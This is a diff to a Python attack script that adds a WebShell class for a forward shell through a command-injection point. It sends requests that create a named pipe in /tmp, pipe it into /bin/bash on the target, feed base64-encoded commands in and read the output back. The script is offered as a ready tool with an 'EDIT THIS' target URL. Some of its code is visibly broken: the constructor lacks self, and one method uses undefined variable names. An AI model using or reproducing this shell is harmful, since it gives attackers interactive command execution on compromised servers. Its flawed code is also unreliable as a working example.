@@ -9,6 +9,72 @@ import argparse
 from time import sleep
 import re
 
+class WebShell():
+    """
+    Webshell that will handle the session
+    """
+    def __init__(url, session, headers, proxies, interval, data):
+        self.session = session
+        self.url = url
+        self.interval = interval
+        self.data = data
+        self.proxies = proxies
+        self.headers = headers
+
+        tmp_name = random.randrange(10000,99999)
+        input_name = f"/tmp/in_{tmp_name}"
+        output_name = f"/tmp/out_{tmp_name}"
+
+        self.input_name = input_name
+        self.output_name = output_name
+
+    def sendPayload(self, payload):
+        b64str = b64encode(bytes(payload,'utf-8') + b'\n').decode()
+        payload = f"/usr/bin/echo '{b64str}' | base64 -d > {self.input_name}"
+        
+        url = self.url.replace("^CMD^", payload)
+        headers = self.headers.replace("^CMD^", payload)
+        if self.data:
+            data = self.data.replace("^CMD^", payload)
+            r = self.session.post(url, headers=headers, data=data, proxies=self.proxies)
+        else:
+            r = self.session.get(url, headers=headers, proxies=self.proxies)
+
+    def recvOutput(self):
+        payload = f"/usr/bin/cat {self.output_name} && /usr/bin/echo -n '' > {self.output_name}"
+
+        url = self.url.replace("^CMD^", payload)
+        headers = self.headers.replace("^CMD^", payload)
+        if self.data:
+            data = self.data.replace("^CMD^", payload)
+            r = self.session.post(url, headers=headers, data=data, proxies=self.proxies)
+        else:
+            r = self.session.get(url, headers=headers, proxies=self.proxies)
+
+        return r.text
+    
+    def createSession(self):
+        payload = f"bash -c 'rm {self.input_name};rm {self.output_name}; mkfifo {self.input_name}'"
+
+        url = self.url.replace("^CMD^", payload)
+        headers = self.headers.replace("^CMD^", payload)
+        if self.data:
+            data = self.data.replace("^CMD^", payload)
+            r = self.session.post(url, headers=headers, data=data, proxies=self.proxies)
+        else:
+            r = self.session.get(url, headers=headers, proxies=self.proxies)
+
+        payload = f"bash -c 'tail -f {input_name} | /bin/bash 2>&1 > {output_name} 2>&1'"
+        
+        url = self.url.replace("^CMD^", payload)
+        headers = self.headers.replace("^CMD^", payload)
+        if self.data:
+            data = self.data.replace("^CMD^", payload)
+            r = self.session.post(url, headers=headers, data=data, proxies=self.proxies)
+        else:
+            r = self.session.get(url, headers=headers, proxies=self.proxies)
+
+
 # EDIT THIS
 url = ""
 #url = "http://localhost:8000/malicious.php"
